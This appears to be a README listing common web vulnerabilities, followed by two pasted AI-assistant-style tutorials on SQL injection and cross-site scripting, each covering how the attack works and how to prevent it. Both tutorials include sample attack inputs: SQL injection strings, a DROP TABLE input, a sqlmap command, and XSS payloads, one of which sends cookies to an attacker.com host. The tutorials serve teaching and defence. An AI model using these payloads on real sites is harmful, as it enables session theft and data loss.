# Common-Vulnerabilities-

SQL Injection: Attackers manipulate database queries.
Cross-Site Scripting (XSS): Malicious scripts are injected into web pages.
Cross-Site Request Forgery (CSRF): Unauthorized actions are performed on behalf of a user.
Insecure File Uploads: Allowing unsafe files to be uploaded.
Broken Authentication: Weak login mechanisms.
Security Misconfigurations: Improperly configured servers or software.
Certainly! SQL Injection (SQLi) is one of the most common and dangerous vulnerabilities in web applications. It occurs when an attacker manipulates a website’s input fields to execute unintended SQL commands on the underlying database. Below, I’ll break down what it is, how it works, its impact, and how to prevent it.

---

### What is SQL Injection?
SQL Injection is a type of attack where malicious SQL code is inserted into a query via user input (e.g., forms, URL parameters). If the application doesn’t properly validate or sanitize this input, the attacker can alter the query’s logic, potentially gaining unauthorized access to data, modifying it, or even taking control of the system.

For example, a login form might expect a username and password, but an attacker could input something like `' OR '1'='1` to bypass authentication.

---

### How Does SQL Injection Work?
Most web applications use SQL databases (e.g., MySQL, PostgreSQL, SQLite) to store and retrieve data. Developers often build SQL queries dynamically using user input. If this input isn’t handled securely, attackers can exploit it.

#### Example Scenario
Imagine a login system with this SQL query:
```sql
SELECT * FROM users WHERE username = 'user' AND password = 'pass';
```
The application takes user input for `username` and `password` and inserts it directly into the query. Now, an attacker enters:
- Username: `' OR '1'='1`
- Password: `anything`

The resulting query becomes:
```sql
SELECT * FROM users WHERE username = '' OR '1'='1' AND password = 'anything';
```
Since `'1'='1'` is always true, the query returns the first user in the database (often an admin), bypassing the password check.

#### Types of SQL Injection
1. **Classic SQL Injection**: Directly manipulates queries via input fields (as above).
2. **Blind SQL Injection**: The attacker infers results based on application behavior (e.g., true/false responses) when direct output isn’t visible.
3. **Time-Based SQL Injection**: Uses delays (e.g., `SLEEP(5)`) to deduce database responses.
4. **Union-Based SQL Injection**: Combines malicious queries with legitimate ones using `UNION` to extract additional data.
5. **Out-of-Band SQL Injection**: Exploits external channels (e.g., DNS requests) to exfiltrate data.

---

### Impact of SQL Injection
The consequences depend on the system’s setup but can include:
- **Data Exposure**: Access to sensitive information (e.g., usernames, passwords, credit card details).
- **Data Manipulation**: Altering or deleting records (e.g., changing account balances).
- **Authentication Bypass**: Logging in as any user without credentials.
- **System Compromise**: In severe cases, executing system commands via database functions (e.g., `xp_cmdshell` in SQL Server).
- **Legal/Reputation Damage**: Breaches can lead to fines, lawsuits, or loss of trust.

A famous real-world example is the 2008 **Heartland Payment Systems breach**, where SQL injection exposed 130 million credit card records.

---

### How Attackers Find SQL Injection Points
- **Manual Testing**: Entering special characters (e.g., `'`, `--`, `;`) into forms or URLs and observing errors or unexpected behavior.
- **Automated Tools**: Tools like **SQLMap** scan for injectable parameters and automate exploitation.
- **Error Messages**: Misconfigured sites may leak database details (e.g., “MySQL error: syntax near…”), guiding attackers.

---

### Prevention Techniques
To protect against SQL Injection, developers and administrators can implement these best practices:

1. **Use Prepared Statements/Parameterized Queries**
   - Instead of concatenating user input into queries, use placeholders. Example in PHP:
     ```php
     $stmt = $pdo->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
     $stmt->execute([$username, $password]);
     ```
   - This ensures input is treated as data, not executable code.

2. **Input Validation and Sanitization**
   - Reject unexpected characters (e.g., quotes, semicolons) or restrict input to specific formats (e.g., alphanumeric only).
   - Use libraries like PHP’s `filter_var()` or frameworks with built-in sanitization.

3. **Escape Special Characters**
   - If parameterized queries aren’t an option, escape input (e.g., MySQL’s `mysql_real_escape_string()`), though this is less secure.

4. **Use an ORM**
   - Object-Relational Mappers (e.g., Hibernate, Django ORM) abstract SQL queries, reducing injection risks.

5. **Least Privilege Principle**
   - Run the database with minimal permissions. For example, a web app shouldn’t use a root account that can drop tables.

6. **Web Application Firewall (WAF)**
   - Deploy a WAF (e.g., Cloudflare, ModSecurity) to detect and block malicious SQL patterns.

7. **Error Handling**
   - Suppress detailed error messages (e.g., database stack traces) and show generic responses to users.

---

### Testing for SQL Injection
If you’re assessing your own site (with permission):
- **Manual Test**: Try inputs like `'`, `1; DROP TABLE users --`, or `' OR '1'='1` in forms or URLs.
- **SQLMap**: Run `sqlmap -u "http://example.com/login.php" --data="username=admin&password=test"` to automate detection and exploitation.
- **Check Logs**: Look for anomalies after testing (e.g., unusual queries).

---

### Fun Fact
SQL Injection has been around since the late 1990s and remains a top threat because of lazy coding practices. The XKCD comic “Exploits of a Mom” famously illustrates it with “Robert'); DROP TABLE Students; --” (aka “Little Bobby Tables”).

Let me know if you’d like a demo of a specific technique or more examples!

Absolutely! Cross-Site Scripting (XSS) is another prevalent web vulnerability that allows attackers to inject malicious scripts into web pages viewed by other users. Here’s a detailed breakdown of what it is, how it works, its impact, and how to prevent it.

---

### What is Cross-Site Scripting (XSS)?
XSS occurs when an attacker exploits a web application’s failure to properly sanitize or escape user input, enabling them to inject malicious code (usually JavaScript) into a webpage. This code executes in the victim’s browser, potentially stealing data, hijacking sessions, or defacing the site.

Unlike SQL Injection, which targets the server’s database, XSS targets the client-side (the user’s browser).

---

### How Does XSS Work?
Web applications often display user-provided data (e.g., comments, usernames, search results). If this data isn’t sanitized, attackers can embed scripts that run when the page loads.

#### Example Scenario
Suppose a website has a comment section. A user submits this comment:
```html
<script>alert('Hacked!');</script>
```
If the site doesn’t filter or escape the input and displays it raw, every visitor’s browser will execute the script, popping up an “Hacked!” alert.

#### Types of XSS
1. **Reflected (Non-Persistent) XSS**
   - The malicious script is part of the request (e.g., a URL parameter) and reflected back in the response.
   - Example: `http://example.com/search?q=<script>alert('XSS')</script>`
   - Common in phishing attacks where victims are tricked into clicking a crafted link.

2. **Stored (Persistent) XSS**
   - The script is stored on the server (e.g., in a database) and served to all users who view the affected page.
   - Example: A malicious script in a forum post that runs for every visitor.
   - More dangerous due to its wider reach.

3. **DOM-Based XSS**
   - The vulnerability lies in client-side JavaScript that manipulates the Document Object Model (DOM) unsafely.
   - Example: A script takes URL input (e.g., `document.write(location.hash)`) and executes it without validation.
   - Harder to detect since it doesn’t involve server interaction.

---

### Impact of XSS
The damage depends on the attacker’s goals, but XSS can lead to:
- **Session Hijacking**: Stealing cookies with `document.cookie` to impersonate users.
- **Data Theft**: Capturing keystrokes or form data (e.g., credit card numbers).
- **Malware Distribution**: Redirecting users to malicious sites or downloading files.
- **Defacement**: Altering webpage content (e.g., replacing text with “You’ve been hacked”).
- **Phishing**: Displaying fake login prompts to steal credentials.

A notable real-world case is the 2005 **MySpace worm** (Samy worm), where XSS spread a script across profiles, adding “Samy is my hero” to millions of pages in hours.

---

### How Attackers Find XSS Vulnerabilities
- **Manual Testing**: Injecting payloads like `<script>alert(1)</script>`, `<img src=x onerror=alert(1)>`, or `"><script>alert(1)</script>` into forms, URLs, or headers.
- **Automated Tools**: Tools like **Burp Suite**, **XSStrike**, or **OWASP ZAP** scan for XSS by submitting payloads and checking responses.
- **Browser Inspection**: Checking if input is reflected in the HTML, JavaScript, or attributes without proper encoding.

---

### Common XSS Payloads
Attackers use various payloads depending on context:
- Basic: `<script>alert('XSS')</script>`
- Image Tag: `<img src="invalid" onerror="alert('XSS')">`
- Event Handler: `<div onmouseover="alert('XSS')">Hover me!</div>`
- URL Encoded (for filters): `%3Cscript%3Ealert(1)%3C/script%3E`
- Advanced: `<script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>`

Filters may block `<script>`, so attackers get creative with tags like `<iframe>`, `<svg>`, or even CSS (`expression()` in older browsers).

---

### Prevention Techniques
To mitigate XSS, developers should focus on secure coding and configuration:

1. **Escape Output**
   - Encode user input before displaying it:
     - HTML: Convert `<` to `&lt;`, `>` to `&gt;`, etc.
     - JavaScript: Escape quotes and special characters (e.g., use `\` or libraries like `encodeURIComponent`).
     - Attributes: Avoid dynamic attributes; encode values.
   - Use libraries like PHP’s `htmlspecialchars()` or JavaScript’s `DOMPurify`.

2. **Content Security Policy (CSP)**
   - Add a CSP header to restrict script sources:
     ```http
     Content-Security-Policy: script-src 'self';
     ```
   - This blocks inline scripts and external sources unless explicitly allowed.

3. **Input Validation**
   - Restrict input to expected formats (e.g., alphanumeric usernames, no `<` or `>`).
   - Use whitelisting (allow only safe characters) over blacklisting.

4. **Avoid Dangerous Practices**
   - Don’t use `eval()`, `innerHTML`, or `document.write()` with untrusted data.
   - Example fix: Replace `element.innerHTML = userInput` with `element.textContent = userInput`.

5. **Secure Cookies**
   - Set the `HttpOnly` flag on cookies (`Set-Cookie: session=xyz; HttpOnly`) to prevent access via JavaScript.
   - Use `Secure` and `SameSite` flags to limit exposure.

6. **Use Frameworks**
   - Modern frameworks (e.g., React, Angular, Vue) often escape output by default, reducing XSS risk.

7. **Web Application Firewall (WAF)**
   - Deploy a WAF to filter malicious payloads (e.g., Cloudflare, ModSecurity).

---

### Testing for XSS
If you’re testing your own site (with permission):
- **Manual Test**: Submit `<script>alert(1)</script>` in forms, URL parameters, or search bars and check if it executes.
- **Burp Suite**: Intercept requests, inject payloads, and monitor responses.
- **Browser Console**: Inspect the DOM to see if input is reflected unsafely.

---

### Fun Fact
XSS got its name because it “crosses” from server-side data to client-side execution. It’s been a top vulnerability since the early 2000s, yet it persists due to sloppy input handling.

Let me know if you want a deeper dive into a specific type, payload, or prevention method!

